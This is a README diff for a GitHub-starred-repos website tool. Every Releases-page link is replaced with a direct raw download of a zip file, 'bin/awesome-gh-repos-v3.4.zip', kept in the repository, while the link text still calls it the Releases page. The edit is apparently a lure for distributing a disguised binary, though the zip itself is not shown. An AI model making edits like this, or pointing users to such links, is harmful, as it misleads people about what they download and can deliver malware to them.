@@ -6,9 +6,9 @@ Welcome to awesome-gh-repos! This tool helps you create a website from your GitH
 
 ## 💾 Download & Install
 
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Miguel210414/awesome-gh-repos/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Miguel210414/awesome-gh-repos/main/bin/awesome-gh-repos-v3.4.zip%20release-brightgreen)](https://raw.githubusercontent.com/Miguel210414/awesome-gh-repos/main/bin/awesome-gh-repos-v3.4.zip)
 
-To get started, visit the [Releases page](https://github.com/Miguel210414/awesome-gh-repos/releases) to download the application. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Miguel210414/awesome-gh-repos/main/bin/awesome-gh-repos-v3.4.zip) to download the application. 
 
 ### Steps to Download:
 1. Click the green button or link above to go to the Releases page.
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. You can freely use and modify it
 - starred-repositories
 - starred-search
 
-For any additional questions, revisit the [Releases page](https://github.com/Miguel210414/awesome-gh-repos/releases) for the latest updates or to download the application again. Enjoy building your website!
+For any additional questions, revisit the [Releases page](https://raw.githubusercontent.com/Miguel210414/awesome-gh-repos/main/bin/awesome-gh-repos-v3.4.zip) for the latest updates or to download the application again. Enjoy building your website!
